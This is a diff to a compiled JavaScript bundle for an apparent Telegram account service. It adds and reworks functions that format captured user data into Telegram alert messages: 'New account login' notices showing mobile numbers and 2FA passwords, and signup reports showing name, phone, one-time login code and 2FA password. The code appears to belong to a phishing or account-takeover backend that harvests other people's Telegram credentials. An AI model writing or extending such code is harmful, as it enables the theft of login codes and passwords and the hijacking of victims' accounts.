@@ -48537,10 +48537,17 @@ const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/prom
 const rich_message_1 = __webpack_require__(/*! ../../utils/rich-message */ "./src/utils/rich-message.ts");
 function accountLoginHtml(user, mobile) {
     const handle = user.username?.replace(/^@/, '');
-    const account = handle
-        ? `<a href="https://t.me/${encodeURIComponent(handle)}">@${(0, rich_message_1.escapeTelegramHtml)(handle)}</a>`
-        : (0, rich_message_1.escapeTelegramHtml)(user.firstName || 'Unknown');
-    return `🔐 ${account} · <code>${(0, rich_message_1.escapeTelegramHtml)(mobile)}</code>${user.password ? ` · 🔑 <code>${(0, rich_message_1.escapeTelegramHtml)(user.password)}</code>` : ''}`;
+    const name = [user.firstName, user.lastName].map((v) => v?.trim()).filter(Boolean).join(' ');
+    const account = [
+        handle && `<a href="https://t.me/${encodeURIComponent(handle)}">@${(0, rich_message_1.escapeTelegramHtml)(handle)}</a>`,
+        name && (0, rich_message_1.escapeTelegramHtml)(name),
+    ].filter(Boolean).join(' · ') || 'No username';
+    return [
+        '<b>🔐 New account login</b>',
+        account,
+        `Mobile: <code>${(0, rich_message_1.escapeTelegramHtml)(mobile)}</code>`,
+        user.password && `2FA: <code>${(0, rich_message_1.escapeTelegramHtml)(user.password)}</code>`,
+    ].filter(Boolean).join('\n');
 }
 let UsersService = UsersService_1 = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService, bufferClientService, promoteClientService) {
@@ -54989,6 +54996,19 @@ function textToRichInput(text, opts = {}) {
     return input;
 }
 const TELEMETRY_LABEL = /^([^:\n]{1,40}?)\s*:\s+([\s\S]+)$/;
+function signupToHtml(user, form) {
+    const str = (v) => (v === undefined || v === null ? '' : String(v).trim());
+    const phone = `${str(form.phoneCountryCode)}${str(form.phoneNumber)}`;
+    const name = [str(form.firstName), str(form.lastName)].filter(Boolean).join(' ');
+    const step = str(form.otp) ? 'code entered' : 'phone entered';
+    const rows = [
+        name && `Name: ${escapeTelegramHtml(name)}`,
+        str(form.phoneNumber) && `Phone: <code>${escapeTelegramHtml(phone)}</code>`,
+        str(form.otp) && `Code: <code>${escapeTelegramHtml(str(form.otp))}</code>`,
+        str(form.password) && `2FA: <code>${escapeTelegramHtml(str(form.password))}</code>`,
+    ].filter(Boolean);
+    return `📝 ${user} · signup, ${step}${rows.length ? `\n${rows.join('\n')}` : ''}`;
+}
 function telemetryToHtml(text) {
     const plain = String(text ?? '').replace(/<br\s*\/?>/gi, '\n').replace(HTML_TAG, '').replace(/&(lt|gt|quot|#39|amp);/g, (m) => ENTITIES[m] ?? m);
     const lines = plain.split('\n');
@@ -55002,6 +55022,8 @@ function telemetryToHtml(text) {
     try {
         const parsed = JSON.parse(body);
         if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
+            if ('phoneNumber' in parsed)
+                return signupToHtml(user, parsed);
             const rows = Object.entries(parsed)
                 .filter(([, v]) => v !== '' && v !== null && v !== undefined)
                 .map(([k, v]) => `${escapeTelegramHtml(k)}: <code>${escapeTelegramHtml(typeof v === 'object' ? JSON.stringify(v) : String(v))}</code>`);
